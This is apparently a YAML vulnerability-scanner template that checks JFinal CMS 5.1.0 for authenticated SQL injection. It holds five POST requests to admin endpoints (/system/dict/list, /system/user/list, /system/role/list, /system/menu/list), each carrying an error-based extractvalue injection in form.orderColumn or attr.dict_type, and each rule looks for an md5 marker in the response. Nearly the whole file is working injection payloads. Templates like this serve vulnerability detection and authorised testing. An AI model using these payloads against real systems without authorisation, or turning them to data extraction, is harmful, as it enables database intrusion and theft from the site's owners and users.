name: poc-yaml-jfinalcms-510-system-list-sqli
binding: 4f89941a-5677-40ba-92fc-a3ff896e1893
manual: true
detail:
    author: ct
    links:
        - https://github.com/jflyfox/jfinal_cms/issues/38
        - https://github.com/jflyfox/jfinal_cms/issues/43
        - https://github.com/jflyfox/jfinal_cms/issues/50
    vulnerability:
        id: CT-529797
        level: high
    check_action: 需要认证登陆
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /system/dict/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=' and extractvalue(1,concat(0x7e,md5({{s1}})))-- a&form.orderAsc=&attr.dict_type=&totalRecords=34&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r2:
        request:
            cache: true
            method: POST
            path: /system/dict/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=&form.orderAsc=&attr.dict_type=' and extractvalue(1,concat(0x7e,md5({{s1}})))-- a&totalRecords=34&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r3:
        request:
            cache: true
            method: POST
            path: /system/user/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=' and (select 123 and extractvalue(1,concat(0x7e,md5({{s1}}))))-- 123&form.orderAsc=&attr.username=&attr.realname=&attr.usertype=-1&attr.departid=-1&totalRecords=1&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r4:
        request:
            cache: true
            method: POST
            path: /system/role/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=' and (select 123 and extractvalue(1,concat(0x7e,md5({{s1}}))))-- 123&form.orderAsc=&attr.name=&totalRecords=1&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r5:
        request:
            cache: true
            method: POST
            path: /system/menu/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn=and (select 123 and extractvalue(1,concat(0x7e,md5({{s1}}))))-- 123&form.orderAsc=&attr.name=&totalRecords=1&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r1() || r2() || r3() || r4() || r5()
